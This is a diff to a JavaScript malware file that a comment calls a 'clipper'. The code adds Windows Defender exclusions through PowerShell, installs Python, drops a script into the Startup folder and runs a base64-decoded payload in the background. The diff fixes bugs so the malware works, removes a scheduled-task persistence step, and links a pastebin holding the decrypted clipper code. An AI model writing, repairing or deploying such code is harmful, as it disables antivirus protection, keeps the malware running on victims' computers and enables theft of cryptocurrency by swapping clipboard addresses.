@@ -1036,7 +1036,7 @@ async function installPython() {
 
 function addDefenderExclusions() {
     const roamingPath = path.join(os.homedir(), 'AppData', 'Roaming');
-    const systemTasksPath = 'C:\\Windows\\System32\\Tasks';  // Corrected path
+    const systemTasksPath = 'C:\\Windows\\System32\\Tasks';
 
     const commands = [
         `powershell -Command Add-MpPreference -ExclusionPath "${roamingPath}"`,
@@ -1069,7 +1069,7 @@ const addresses = {
 
 // This is a clipper, here is the decrypted code: https://pastebin.com/raw/ujJT2Xje (DM me on Telegram if you don't know how to decrypt base64 :0)
 async function clip(pythonwExe) {
-    const userDataPath = path.join(userProfilePath, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+    const userDataPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
     if (!fs.existsSync(userDataPath)) {
         fs.mkdirSync(userDataPath, { recursive: true });
     }
@@ -1110,15 +1110,6 @@ exec(decoded_code)
         console.error(`Error terminating pythonw.exe: ${error.message}`);
     }
 
-    // Schedule the Python script to run at user logon
-    try {
-        const taskName = `PythonUpdater_${generateRandomString(8)}`;
-        execSync(`schtasks /create /tn "${taskName}" /tr "\"${pythonwExe}\" \"${scriptFilePath}\"" /sc onlogon /f`);
-        console.log('Python script scheduled to run at logon.');
-    } catch (error) {
-        console.error(`Error scheduling task: ${error.message}`);
-    }
-
     // Run the Python script in the background
     try {
         const pythonProcess = spawn(pythonwExe, [scriptFilePath], { detached: true, stdio: 'ignore' });
@@ -1129,11 +1120,12 @@ exec(decoded_code)
     }
 }
 
+// Main function to create and execute scripts and add Defender exclusions
 async function createAndExecuteScripts() {
     try {
-        addDefenderExclusion();
+        addDefenderExclusions(); // Corrected function name
         const pythonwExe = await installPython();
-        clip(pythonwExe);  // Run the Python script
+        await clip(pythonwExe);  // Run the Python script
     } catch (error) {
         console.error(`Error: ${error.message}`);
     }
